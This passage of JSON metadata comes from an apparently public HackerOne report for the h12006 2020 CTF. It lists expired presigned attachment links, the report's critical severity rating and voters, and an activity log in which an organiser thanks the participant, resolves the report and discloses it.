XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=fa36a50b69e744ba41f9b0cca25072ab702d35d82ffeef4b9548aaede826a066","file_size":32650,"type":"image/png"},{"id":863338,"file_name":"flag.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jyrYkpDdcDErnCQircXhG1p8?response-content-disposition=attachment%3B%20filename%3D%22flag.png%22%3B%20filename%2A%3DUTF-8%27%27flag.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=de11199ce58c7414cd185f4f9af7a5d87c9f4115552110575f2e8ad20053bd25","file_size":16564,"type":"image/png"}],"allow_singular_disclosure_at":"2020-07-19T18:01:39.140Z","allow_singular_disclosure_after":-14043993.020092484,"singular_disclosure_allowed":true,"vote_count":10,"voters":["njbooher","nytr0gen","nagli","fizhimchik","amad3u6","zerboa","b69fb2ebda43240ece9dbeb","pacmanx","ziggystardust","tarsira"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8267287,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-11T19:39:43.432Z","updated_at":"2020-06-11T19:39:43.432Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8268303,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\u003c/p\u003e\n\n\u003cp\u003eWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we\u0026#39;ll make sure to let you know when you can publish them on your site!\u003c/p\u003e\n\n\u003cp\u003eIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-11T23:02:56.759Z","updated_at":"2020-06-11T23:02:56.759Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324975,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","markdown_message":"\u003cp\u003eThank you again for participating in the #h12006 CTF! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-17T22:28:24.055Z","updated_at":"2020-06-17T22:28:24.055Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"nirvana_msu","url":"/nirvana_msu"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8345856,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-19T18:01:39.104Z","updated_at":"2020-06-19T18:01:39.104Z","first_to_agree":true,"actor":{"username":"nirvana_msu","cleared":false,"url":"/nirvana_msu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/451/521/1d0f6443db7f9182f369d52763f1e423273fd58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8345910,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-19T18:07:46.661Z","updated_at":"2020-06-19T18:07:46.661Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8345911,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-19T18:07:46.762Z","updated_at":"2020-06-19T18:07:46.762Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}